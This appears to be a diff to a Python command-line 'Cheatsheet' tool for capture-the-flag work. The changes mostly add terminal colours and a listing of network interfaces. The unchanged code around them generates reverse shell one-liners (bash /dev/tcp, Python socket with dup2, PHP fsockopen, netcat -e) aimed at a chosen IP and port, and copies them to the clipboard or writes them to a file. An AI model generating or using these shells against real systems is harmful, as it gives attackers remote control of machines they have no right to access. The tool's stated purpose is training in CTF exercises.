@@ -24,20 +24,21 @@ def main():
                                                                              """
     print(banner)
     print('<------------------------------------------------------->')
-    print('[*] Welcome to the Cheatsheet')
-    print('[*] This tool is made to help you through the process of CTFs')
-    print('[*] You can use this tool to create a reverse shell')
+    print(f'{Fore.YELLOW}[*]{Fore.RESET} Welcome to the Cheatsheet')
+    print(f'{Fore.YELLOW}[*]{Fore.RESET} This tool is made to help you through the process of CTFs')
+    print(f'{Fore.YELLOW}[*]{Fore.RESET} You can use this tool : to create a reverse shell, bruteforce a password, and a lot more')
+    print(f'{Fore.YELLOW}[*]{Fore.RESET} Made by : {Style.BRIGHT}{Fore.LIGHTCYAN_EX}https://github.com/Oxooi{Fore.RESET}{Style.RESET_ALL}')
     print("")
     print("+-------------------------------------+")
-    print(f"|[1] {Fore.LIGHTYELLOW_EX}Create Reverse Shells{Fore.RESET}            |")
-    print(f"|[2] {Fore.LIGHTYELLOW_EX}Netcat Connection{Fore.RESET}                |")
-    print(f"|[3] {Fore.LIGHTYELLOW_EX}Set Interface IP{Fore.RESET} ({Fore.LIGHTRED_EX}IMPORTANT{Fore.RESET})     |")
+    print(f"|{Fore.YELLOW}[1] {Fore.LIGHTYELLOW_EX}Create Reverse Shells{Fore.RESET}            |")
+    print(f"|{Fore.YELLOW}[2] {Fore.LIGHTYELLOW_EX}Netcat Connection{Fore.RESET}                |")
+    print(f"|{Fore.YELLOW}[3] {Fore.LIGHTYELLOW_EX}Set Interface IP{Fore.RESET} ({Fore.LIGHTRED_EX}IMPORTANT{Fore.RESET})     |")
     print("+-------------------------------------+")
     print("")
-    print(f"{Fore.LIGHTRED_EX}[{Fore.YELLOW}#{Fore.LIGHTRED_EX}] {Fore.RED}Local IP {Fore.RESET}: {Style.BRIGHT}{Fore.CYAN}" + ipadd + f"{Fore.RESET}{Style.RESET_ALL}")
-    print(f"{Fore.LIGHTRED_EX}[{Fore.YELLOW}#{Fore.LIGHTRED_EX}] {Fore.RED}Interface {Fore.RESET}: {Style.BRIGHT}{Fore.CYAN}" + interf + f"{Fore.RESET}{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}[+] {Style.BRIGHT}{Fore.LIGHTBLUE_EX}Local IP {Fore.RESET}: " + ipadd + f"{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}[+] {Style.BRIGHT}{Fore.LIGHTBLUE_EX}Interface {Fore.RESET}: " + interf + f"{Style.RESET_ALL}")
     print("\n\n-------------")
-    choice = input('\n[*] Enter your choice : ')
+    choice = input(f'\n{Fore.YELLOW}[*]{Fore.RESET} Enter your choice : ')
     match choice:                                                       #Match choice
         case '1':                                                      #Create reverse shell
             revershell()
@@ -59,39 +60,51 @@ def banner():
 """
     print(banner)
 
+
 #Get IP of interface function
 def getIp(interface):
     ipInt = ifaddresses(interface)[AF_INET][0]['addr']
     return ipInt
 
+def getInterfaces(): #Get interfaces function
+    #Loop through interfaces to get names and IPs
+    x = 0
+    for i in interfaces():
+        x += 1
+        print(Fore.GREEN + "\n[+] " + Style.BRIGHT + Fore.LIGHTBLUE_EX + i + Style.RESET_ALL + Fore.RESET)
+        addresses = [i['addr'] for i in ifaddresses(i).setdefault(AF_INET, [{'addr':'No IP addr'}] )]
+        print(' ' + Fore.GREEN +'└─> ' + Style.RESET_ALL + '(' + Style.BRIGHT +'\t'.join(addresses) + Style.RESET_ALL + ')')
+
+
 #Set IP to global variable 'ipadd'
 def setIp():
-    interface = input('[*] Enter your interface : ')
+    getInterfaces()
+    interface = input(f'\n{Fore.YELLOW}[*]{Fore.RESET}{Style.BRIGHT} Enter the interface (lo,eth0,wlan0) :{Style.RESET_ALL} ')
     getIp(interface)
     globals()['ipadd'] = getIp(interface)
     globals()['interf'] = interface
 
 def choice(shell, extention): #Choice for reverse shell
     choice = input(
-        f'\n[*] Do you want to {Fore.YELLOW}Copy{Fore.RESET} your shell to clipboard or export as {Fore.RED}File{Fore.RESET} ? ({Fore.YELLOW}c{Fore.RESET}/{Fore.RED}f{Fore.RESET}) : ')
+        f'\n{Fore.YELLOW}[*]{Fore.RESET} Do you want to {Fore.YELLOW}Copy{Fore.RESET} your shell to clipboard or export as {Fore.RED}File{Fore.RESET} ? ({Fore.YELLOW}c{Fore.RESET}/{Fore.RED}f{Fore.RESET}) : ')
     match choice:                                                                   #Match choice
         case 'c':                                                                   #Case C for copy to clipboard
             pyperclip.copy(shell)                                                   #Copy reverse shell command to clipboard
-            print("\n[*] Your shell is copied to Clipboard")
+            print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is copied to Clipboard")
             sleep(1)
             backtomain()                                                            #Go back to main menu
         case 'f':                                                                   #Case F for export as file
             file = "shell." + extention                                                       #Create file name
             with open(file, "w") as f:                                              #Open file and write reverse shell command
                 f.write(shell)                                                      #Write reverse shell command to file
-            print("\n[*] Your shell is exported as " + file)
+            print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is exported as " + file)
             sleep(1)
             backtomain()
     return shell, extention
 
 #Go back to main menu function
 def backtomain():
-    print('\n[*] Go back to main')
+    print(f'\n{Fore.YELLOW}[*]{Fore.RESET} Go back to main')
     sleep(1)
     os.system('clear')
     main()
@@ -108,7 +121,7 @@ def revershell():
 - [{Style.BRIGHT}6{Style.RESET_ALL}] {Style.BRIGHT}Exit {Style.RESET_ALL}
 """
     print(shells)
-    c_rs = input('\n[*] Enter your choice : ') #Choice for reverse shell
+    c_rs = input(f'\n{Fore.YELLOW}[*]{Fore.RESET} Enter your choice : ') #Choice for reverse shell
     match c_rs:  #Match choice
         case '1': #Bash reverse shell
             bash()
@@ -127,19 +140,19 @@ def bash():
     banner()
     port1 = "1234"                                                                  #Setup default port for reverse shell
     if ipadd == "0.0.0.0":                                                          #Check if IP address and Interface  is set
-        print("[!] You need to set your interface ip")
+        print(f"{Fore.RED}[!] {Fore.LIGHTRED_EX}You need to set your interface ip" + Fore.RESET)
         setIp()
         bash()                                                                      #Callback bash function 
     else:                                                                           #If IP address and Interface is set
-        port = input('[*] Enter your port (Default : 1234) : ')
+        port = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter your port (Default : 1234) : ')
         if port == '':
             port = port1                                                            #If no port is entered, use default port
         else:
             globals()['port'] = port                                                #If port is entered, set it to global variable
-    print("\n[*] Your shell is creating...")
+    print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is creating...")
     sleep(1)
     shell = 'bash -i >& /dev/tcp/' + ipadd + '/' + port + ' 0>&1'                   #Create reverse shell command
-    print("\n[*] Your shell is created")
+    print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is created")
     choice(shell, "sh")                                                             #Call choice function for reverse shell
 
 
@@ -148,21 +161,21 @@ def python():                                                                   
     banner()
     port1 = "1234"
     if ipadd == "0.0.0.0":                                                         
-        print("[!] You need to set your interface ip")
+        print(f"{Fore.RED}[!]{Fore.RESET} You need to set your interface ip")
         setIp()
         python()
     else:
-        port = input('[*] Enter your port (Default : 1234) : ')
+        port = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter your port (Default : 1234) : ')
         if port == '':
             port = port1
         else:
             globals()['port'] = port
-    print("\n[*] Your shell is creating...")
+    print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is creating...")
     sleep(1)
     shell = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + ipadd + \
         '",' + port + \
             '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
-    print("[*] Your shell is created")
+    print(f"{Fore.YELLOW}[*]{Fore.RESET} Your shell is created")
     choice(shell, "py")
     
 
@@ -172,20 +185,20 @@ def php():                                                                      
     banner()
     port1 = "1234"
     if ipadd == "0.0.0.0":
-        print("[!] You need to set your interface ip")
+        print(f"{Fore.RED}[!]{Fore.RESET} You need to set your interface ip")
         setIp()
         php()
     else:
-        port = input('[*] Enter your port (Default : 1234) : ')
+        port = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter your port (Default : 1234) : ')
         if port == '':
             port = port1
         else:
             globals()['port'] = port
-    print("\n[*] Your shell is creating...")
+    print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is creating...")
     sleep(1)
     shell = "php -r '$sock=fsockopen(" + ipadd + \
         "," + port+");exec('/bin/sh -i <&3 >&3 2>&3');'"
-    print("[*] Your shell is created")
+    print(f"{Fore.YELLOW}[*]{Fore.RESET} Your shell is created")
     choice(shell, "php")
 
 
@@ -194,19 +207,19 @@ def nc():                                                                       
     banner()
     port1 = "1234"
     if ipadd == "0.0.0.0":
-        print("[!] You need to set your interface ip")
+        print(f"{Fore.RED}[!]{Fore.RESET} You need to set your interface ip")
         setIp()
         nc()
     else:
-        port = input('[*] Enter your port (Default : 1234) : ')
+        port = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter your port (Default : 1234) : ')
         if port == '':
             port = port1
         else:
             globals()['port'] = port
-    print("\n[*] Your shell is creating...")
+    print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is creating...")
     sleep(1)
     shell = "nc -e /bin/sh " + ipadd + " " + port
-    print("[*] Your shell is created")
+    print(f"{Fore.YELLOW}[*]{Fore.RESET} Your shell is created")
     choice(shell, "sh")
     
 
